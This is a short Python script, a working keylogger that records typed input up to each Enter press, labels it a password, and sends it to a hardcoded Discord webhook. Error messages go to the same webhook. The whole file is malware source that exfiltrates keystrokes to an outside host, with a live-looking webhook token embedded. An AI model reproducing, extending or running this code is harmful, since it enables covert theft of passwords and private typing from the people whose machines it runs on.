import keyboard
import requests
import json

# Define your webhook URL here
WEBHOOK_URL = "https://discord.com/api/webhooks/1409220302231179284/imFcSXJiYJYRDgns75sV8739j1HsDOdcIGiC9KjO9BodgZ352hCxf1rXTWzX5KxvmRqJ"  # Replace with your actual webhook URL

def send_to_webhook(data):
    try:
        payload = {"content": data}
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200 or response.status_code == 204:
            print("Successfully sent to webhook")
        else:
            print(f"Failed to send to webhook: {response.status_code}")
    except Exception as e:
        print(f"Error sending to webhook: {str(e)}")

while True:
    try:
        # Record key presses until 'enter' is pressed
        events = keyboard.record('enter')
        password = list(keyboard.get_typed_strings(events))
        
        if password:  # Check if there's any captured input
            # Send the captured input to the webhook
            send_to_webhook(password[0])
            
    except Exception as e:
        # Log any errors to the webhook as well
        send_to_webhook(f"Error in keylogger: {str(e)}")